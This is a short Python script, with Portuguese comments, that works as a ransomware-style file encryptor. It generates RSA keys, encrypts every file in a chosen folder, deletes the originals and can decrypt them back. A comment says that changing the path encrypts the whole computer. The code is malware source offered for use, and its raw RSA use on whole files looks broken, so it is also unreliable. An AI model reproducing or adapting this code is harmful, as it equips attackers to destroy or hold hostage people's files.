from Crypto import Random
from Crypto.PublicKey import RSA
import os.path
import os
from PIL import Image

# para criptografar o pc inteiro basta trocar a váriavel path para o caminho inicial
path = "test"
kpub_filename = "rsa.pub"
kprv_filename = "rsa.prv"
opc = 2
# opc = 1, enc
# opc = 2, desc

def gen_keys():
    modulus_lenght = 256 * 4
    private_key = RSA.generate(modulus_lenght, Random.new().read)
    public_key = private_key.publickey()
    return private_key, public_key

def save_keys(private_key, public_key):
    prv_file = open(kprv_filename, "wb")
    pub_file = open(kpub_filename, "wb")
    
    prv_file.write(private_key.exportKey("PEM"))
    pub_file.write(public_key.exportKey("PEM"))
    
    prv_file.close()
    pub_file.close()

def read_keys():
    prv_file = open(kprv_filename, "rb")
    pub_file = open(kpub_filename, "rb")

    prv_key_obj = RSA.importKey(prv_file.read())
    pub_key_obj = RSA.importKey(pub_file.read())
    
    prv_file.close()
    pub_file.close()
    
    return  prv_key_obj, pub_key_obj

def main():
    if(not os.path.exists(kpub_filename) or not os.path.exists(kprv_filename)):
        prv_key, pub_key = gen_keys()
        save_keys(prv_key, pub_key)
    
    prv_key, pub_key = read_keys()

    os.chdir(path)
    if(opc == 1):
        for f in os.listdir('.'):
            with open(f, "rb") as r:
                data = r.read()
                r.close()
                enc = pub_key.encrypt(data, 32)
                new_f = "end"+os.path.basename(f)
                print(new_f)
                with open(new_f, "wb") as n:
                    for i in enc:
                        n.write(i)
                    n.close()

                    os.remove(f)
    else:
        for f in os.listdir('.'):
            with open(f, "rb") as r:
                data = r.read()
                r.close()
                denc = prv_key.decrypt(data)
                new_f = "d"+os.path.basename(f)
                with open(new_f, "wb") as n:
                    n.write(denc)
                    n.close()
                    os.remove(f)

main()
